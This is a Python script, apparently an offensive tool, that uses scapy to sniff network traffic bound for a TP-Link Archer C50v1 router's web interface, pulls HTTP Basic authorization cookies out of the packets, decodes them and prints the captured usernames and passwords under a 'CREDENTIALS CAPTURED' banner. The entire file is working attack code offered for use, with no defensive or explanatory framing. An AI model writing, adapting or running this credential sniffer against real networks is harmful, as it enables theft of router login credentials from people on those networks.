import re
import base64
import argparse

from scapy.all import sniff, IP, TCP, Raw


class PasswordStealer:
    def __init__(self, target, port, interface):
        self.target = target
        self.port = port
        self.interface = interface
        self.pattern = r"Authorization=Basic ([A-Za-z0-9+/=]+)"
        self.cookie = None

    def sniff(self):
        # Main methode of the PasswordStealer class
        filter_string = f"dst host {self.target}"
        sniff(filter=filter_string, prn=self._process_packet, iface=self.interface, store=0)


    def _process_packet(self, packet) -> None:
        # Check if IP and TCP are in the sniffed packet.
        if IP in packet and TCP in packet:
            if Raw in packet:
                # Extract Raw data from packet
                payload = packet[Raw].load
                # Decode raw data into ascii string
                ascii_data = payload.decode('ascii', errors='ignore')

                # Check if login was successful
                if "css" in ascii_data:

                    # Regex to find the used cookie
                    match = re.search(self.pattern, ascii_data)

                    # Extracts and decodes the password.
                    if self.cookie != match.group(1):
                        self.cookie = match.group(1)
                        self._print_found_creds()


    def _print_found_creds(self) -> None:
        # Decode the found cookie
        base64_bytes = base64.b64decode(self.cookie)
        base64_user_pass = base64_bytes.decode("ascii")
        user_pass = base64_user_pass.split(":")

        print("\n" + "=" * 50)
        print("SUCCESS! CREDENTIALS CAPTURED")
        print("=" * 50)
        print(f"Username: {user_pass[0]}")
        print(f"Password: {user_pass[1]}")
        print(f"Cookie: Authorization=Basic {self.cookie}")
        print("=" * 50 + "\n")


if __name__ == "__main__":
    # Create argument parser with a description
    parser = argparse.ArgumentParser(description="Password Stealer CLI, for Archer C50v1 webinterface.")

    # Define arguments
    parser.add_argument("--host", "-H", type=str, required=True,
                        help="Target host IP address (e.g., 192.168.0.1)")
    parser.add_argument("--port", "-p", type=int, required=True,
                        help="Target port number (e.g., 80)")
    parser.add_argument("--interface", "-i", type=str, required=True,
                        help="Network interface (e.g., tap1_0.3)")

    # Parse arguments
    args = parser.parse_args()

    # Create PasswordStealer instance with the values
    ps = PasswordStealer(args.host, args.port, args.interface)
    ps.sniff()


